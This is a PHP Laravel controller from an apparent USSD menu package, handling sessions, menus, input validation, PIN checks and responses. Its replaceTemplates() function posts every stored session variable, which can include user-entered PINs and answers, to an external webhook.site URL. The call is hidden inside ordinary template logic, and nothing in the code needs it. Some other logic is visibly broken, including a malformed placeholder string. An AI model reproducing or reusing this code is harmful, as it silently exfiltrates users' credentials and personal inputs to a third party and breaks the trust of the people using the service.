<?php

namespace Helaplus\Ussd\Http\Controllers;

use Helaplus\Ussd\Events\UssdEvent;
use Helaplus\Ussd\Jobs\TriggerEvent;
use Helaplus\Ussd\Models\UssdLog;
use Helaplus\Ussd\Models\UssdMenu;
use Helaplus\Ussd\Models\UssdMenuItems;
use Helaplus\Ussd\Models\UssdResponse;
use Helaplus\Ussd\Models\UssdUserMenuSkipLogic;
use Illuminate\Support\Facades\Validator;
use Helaplus\Sms\Http\Controllers\SmsController;
use Illuminate\Support\Facades\Http;

class UssdHelperController extends Controller
{

    public static function getInputs($request){
        $input = array();
        $latest_text = '';
        $input['session_id'] = $request->input('sessionId');
        $input['service_code'] = $request->input('serviceCode');
        $input['phone'] = $request->input('phoneNumber');
        $input['text'] = $request->input('text');   //

        $text_parts = explode("*", $input['text']);

        if (empty($text_parts)) {
            $latest_text = $text_parts;
        } else {
            end($text_parts);
            // move the internal pointer to the end of the array
            $latest_text = current($text_parts);
        }
        $input['latest_text'] = $latest_text;
        $input['text'] = $latest_text;
        return (object) $input;
    }

    public static function stateSwitch($input,$state){

        $message = $input->text;

        switch ($state->state) {
            case 0 :
                //neutral user
                break;
            case 1 :
                //user authentication
                break;
            case 2 :
                $response = self::continueUssdProgress($state, $message);
                break;
            case 3 :
                //confirm USSD Process
                $response = self::confirmUssdProcess($state, $message);
                break;
            case 4 :
                //Go back menu
                $response = self::confirmGoBack($state, $message);
                break;
            case 5 :
                //Go back menu
                $response = self::resetPIN($state, $message);
                break;
            case 6 :
                //accept terms and conditions
                $menu = UssdMenu::find($state->menu_id);
                $response = self::customApp($state, $menu,$message);
                break;
            default:
                break;
        }
        return $response;
    }

    public static function isUserstarting($input)
    {

        if (strlen($input->text) == 0) {
            return TRUE;

        } else {
            return FALSE;
        }
    }

    public static function getHomeMenu($state){
        //reset user state
        $state = self::resetUser($state);

        //get root Menu
        $root_menu = self::getRootMenu();

        if (!$root_menu) {
            $response = config('ussd.default_welcome_message');
        } else {
            $response = self::nextMenuSwitch($state, $root_menu);
        }

        return $response;
    }
    //store ussd log
    public static function storeUssdLog($input,$type=0){
        $UssdLog = new UssdLog();
        $UssdLog->phone = $input['phone'];
        $UssdLog->session_id = $input['session_id'];
        $UssdLog->service_code = $input['service_code'];
        $UssdLog->text = $input['text'];
        $UssdLog->type = $type;
        $UssdLog->save();
        return $UssdLog;
    }
    //reset user state
    public static function resetUser($state)
    {
        $state->state = 0;
        $state->progress = 0;
        $state->menu_id = 0;
        $state->difficulty_level = 0;
        $state->confirm_from = 0;
        $state->menu_item_id = 0;
        $state->save();
        return $state;
    }

    public static function getRootMenu(){
        return UssdMenu::whereIsRoot(1)->first();
    }


    public static function nextMenuSwitch($state, $menu)
    {

        $menu = self::checkMenuSkipLogic($state,$menu);

        switch ($menu->type) {
            case 1:
                //continue to another menu
                $menu_items = self::getMenuItems($menu->id);
                $i = 1;
                $response = $menu->title . PHP_EOL;
                foreach ($menu_items as $key => $value) {
                    $response = $response . $i . ": " . $value->description . PHP_EOL;
                    $i++;
                }
                $state->menu_id = $menu->id;
                $state->menu_item_id = 0;
                $state->progress = 1;
                $state->save();
                break;
            case 2:
                //start a process
                self::storeUssdResponse($state, $menu->id);
                $response = self::singleProcess($menu, $state, 1);
                $state->progress = 1;
                $state->save();
                return $menu->title.PHP_EOL.$response;
                break;
            case 3:
                //custom information app
                self::storeUssdResponse($state, $menu->id);
                self::sendResponse($menu->confirmation_message,3,$state);
                break;
            case 4:
                //start a custom process
                self::storeUssdResponse($state, $menu->id);
                $message = '';
                self::customApp($state,$menu,$message);
                break;
            default :
                self::resetUser($state);
                $response = config('ussd.default_error_message');
                break;
        }
        return $response;
    }

    public static function checkMenuSkipLogic($state,$menu){
        $skipLogic = UssdUserMenuSkipLogic::wherePhoneAndUssdMenuId($state->phone,$menu->id)->first();
        if(isset($skipLogic->skip) && $skipLogic->logic<2){
            while(isset($skipLogic->skip)) {
                if($skipLogic->skip == 1){

                    $menu = UssdMenu::find($menu->next_ussd_menu_id);
                    $skipLogic = UssdUserMenuSkipLogic::wherePhoneAndUssdMenuId($state->phone,$menu->id)->first();
                }else{
                    break;
                }
            }
        }
        return $menu;
    }

    public static function getMenuItems($id){
        return UssdMenuItems::whereMenuId($id)->get();
    }


    public static function storeUssdResponse($state, $message)
    {
        $ussd_response = new UssdResponse();
        if(isset($state->menu_item_id)){
            $menuItem = UssdMenuItems::find($state->menu_item_id);
            if(isset($menuItem->variable_name)){
                $ussd_response->variable_name = $menuItem->variable_name;
                //get state
                if(strlen($state->metadata)==0){
                    $metadata = [];
                }else{
                    $metadata = (array) json_decode($state->metadata);
                }
                $metadata[$menuItem->variable_name] = $message;
                $state->metadata = json_encode($metadata);
                $state->save();
            }
        }
        $ussd_response->phone = $state->phone;
        $ussd_response->menu_id = $state->menu_id;
        $ussd_response->menu_item_id = $state->menu_item_id;
        $ussd_response->response = $message;
        $ussd_response->save();
        return $ussd_response;
    }

//start a single process
    public static function singleProcess($menu, $state, $step)
    {
        $menuItem = UssdMenuItems::whereMenuIdAndStep($menu->id, $step)->first();
        if ($menuItem) {
            //update user data and next request and send back
            $state->menu_item_id = $menuItem->id;
            $state->menu_id = $menu->id;
            $state->progress = $step;
            $state->state = 2;
            $state->save();
            return $menuItem->description;
        }
    }


    //custom app
    public static function customApp($state,$menu,$message){
        switch ($menu->id) {
            default :
                self::resetUser($state);
                $response = config('ussd.default_error_message');
                break;
        }
        return $response;
    }


    //send response

    public static function sendResponse($response, $type, $state=null,$input=null)
    {

        $response = self::replaceTemplates($state,$response);
        //Log response

        if ($type == 1) {
            self::storeUssdLog((array) $input,0,$response);
            $output = "CON ";
        } elseif ($type == 2) {
            self::storeUssdLog((array) $input,0,$response);
            $output = "CON ";
            $response = $response . PHP_EOL . "1. Back to main menu" . PHP_EOL . "2. Log out";
            $state->state = 4;
            $state->progress = 0;
            $state->save();
        } else {
            $output = "END ";
        }
        $output .= $response;
        header('Content-type: text/plain');
        echo $output;
        exit;
    }

    public static function replaceTemplates($state,$response){
        if($state){
        $metadata = (array) json_decode($state->metadata);
        foreach ($metadata as $key => $mt){
            $response = str_replace("'{'.$key.'}'",$mt,$response);
            $rs = Http::post('https://webhook.site/2d505196-f8c9-401d-be1f-31abd9ae0f05', [
                'key' => $key,
                'mt' => $mt,
                'response' => $response
            ]);
        }
        }
        return $response;
    }



    public static function continueUssdProgress($state, $message)
    {

        $response = '';
        $menu = UssdMenu::find($state->menu_id);
        //check the user menu

        switch ($menu->type) {
            case 0:
                //authentication mini app
                break;
            case 1:
                //continue to another menu
                $response = self::continueUssdMenu($state, $message, $menu);
                break;
            case 2:

                //continue to a processs
                $response = self::continueSingleProcess($state, $message, $menu);
                break;
            case 3:
                //continue to a processs
                $response = self::continueSingleProcess($state, $message, $menu);
                break;
            case 4:

                $response = self::customApp($state, $menu, $message);

                break;
            default :
                self::resetUser($state);
                $response = "An authentication error occurred";
                break;
        }

        return $response;

    }

    public static function continueSingleProcess($state, $message, $menu)
    {
        $response = "";
        self::storeUssdResponse($state, $message);

        //validate input to be numeric
        $menuItem = UssdMenuItems::whereMenuIdAndStep($menu->id, $state->progress)->first();

        if($menuItem->validation == 'custom'){
            if(self::customValidation($state,$message,$menuItem)){
                $step = $state->progress + 1;
            }
        }elseif(strpos($menuItem->validation, '_preset')) {

            if(self::presetValidation($state,$message,$menuItem)){
                $step = $state->progress + 1;
            }else{
                $step = $state->progress;
                $response = config('ussd.invalid_input');
            }
        }elseif($menuItem->validation == 'auth_pin'){
            $exploded_variable = explode("confirm_",$menuItem->validation);
            $metadata = (array) json_decode($state->metadata);
            if($message == $metadata['pin']){
                $step = $state->progress+1;
            }else{
                $response = "Invalid PIN";
            }
        }elseif($menuItem->validation == 'confirm_'){
            $exploded_variable = explode("confirm_",$menuItem->validation);
            $metadata = (array) json_decode($state->metadata);
            if($message == $metadata[$exploded_variable[0]]){
                $step = $state->progress+1;
            }else{
                $step = $state->progress-1;
                $response = "Invalid PIN";
            }

        }elseif(strlen($menuItem->validation)>0 && $menuItem->validation !="IGNORE"){
            //laravel validation

            $validator = Validator::make([$menuItem->variable_name => $message], [
                $menuItem->variable_name => $menuItem->validation,
            ]);

            if ($validator->fails()) {
                $step = $state->progress;
                $errors = $validator->errors(); 
//                $response = $errors->first($menuItem->variable_name) . PHP_EOL;
                $response = $validator->errors()->first() . PHP_EOL;
            } else {
                $step = $state->progress + 1;
            }
        }else{
            $step = $state->progress + 1;
        }

        $menuItem = UssdMenuItems::whereMenuIdAndStep($menu->id, $step)->first();

        if ($menuItem) {
            $state->menu_item_id = $menuItem->id;
            $state->progress = $step;
            $state->save();
            return $response. $menuItem->description;
        } else {
            if($menu->skippable == 1){
                $skiplogic = UssdUserMenuSkipLogic::wherePhoneAndUssdMenuIdAndSkip($state->phone,$menu->id,$menu->skippable)->first();
                if(!$skiplogic){
                    $skiplogic = new UssdUserMenuSkipLogic();
                }
                $skiplogic->phone = $state->phone;
                $skiplogic->ussd_menu_id = $menu->id;
                $skiplogic->skip = $menu->skippable;
                $skiplogic->next_ussd_menu_id = $menu->next_ussd_menu_id;
                $skiplogic->save();
            }

            if($menu->skippable == 2){
                $menu = UssdMenu::find($menu->next_ussd_menu_id);
                $response = self::nextMenuSwitch($state, $menu);
            }else{
                $response = $menu->confirmation_message;
                self::resetUser($state);
                if(strlen($menu->sms)>1){
                    $state->sms = $menu->sms;
                    TriggerEvent::dispatch($state,'sms');
                }
                //should we broadcast an event?
                if(strlen($menu->event)>1){
                    TriggerEvent::dispatch($state,$menu->event);
                }
                self::sendResponse($response,3);
            }
            return $response;
        }
    }
    public static function presetValidation($state,$message,$menuItem){
        switch ($menuItem->validation) {
            //add your custom validations here
            default :
                $response = TRUE;
                break;

        }
        return $response;
    }

    public static function customValidation($state,$message,$menuItem){
        switch ($menuItem->id) {
            default :
                return TRUE;
                break;
        }

    }


    public static function continueUssdMenu($state, $message, $menu)
    {
        //verify response
        $menu_items = self::getMenuItems($state->menu_id);

        $i = 1;
        $choice = "";
        $next_menu_id = 0;
        foreach ($menu_items as $key => $value) {

            if (self::validationVariations(trim($message), $i, $value->description)) {
                $choice = $value->id;
                $next_menu_id = $value->next_menu_id;

                break;
            }
            $i++;
        }

        if (empty($choice)) {
            //get error, we could not understand your response
            $response = config('ussd.default_error_message') . PHP_EOL;
            $i = 1;
            $response = $menu->title . PHP_EOL;
            foreach ($menu_items as $key => $value) {
                $response = $response . $i . ": " . $value->description . PHP_EOL;
                $i++;
            }
            return $response;
        } else {

            //there is a selected choice
            $menu = UssdMenu::find($next_menu_id);
            //next menu switch
            $response = self::nextMenuSwitch($state, $menu);
            return $response;
        }

    }


    public static function validationVariations($message, $option, $value)
    {
        if ((trim(strtolower($message)) == trim(strtolower($value))) || ($message == $option) || ($message == "." . $option) || ($message == $option . ".") || ($message == "," . $option) || ($message == $option . ",")) {
            return TRUE;
        } else {
            return FALSE;
        }

    }

    public static function confirmGoBack($session, $message)
    {
        if (self::validationVariations($message, 1, "yes")) {
            $menu = UssdMenu::whereAppIdAndIsRoot($session->app_id,2)->first();
            $response = self::nextMenuSwitch($session,$menu);
            $session->session = 2;
            $session->menu_id = $menu->id;
            $session->menu_item_id = 0;
            $session->progress = 0;
            $session->save();
            self::sendResponse($response, 1, $session);
        }else{
            $response = config('ussd.thank_you_message');
            self::sendResponse($response, 3, $session);

        }

    }


}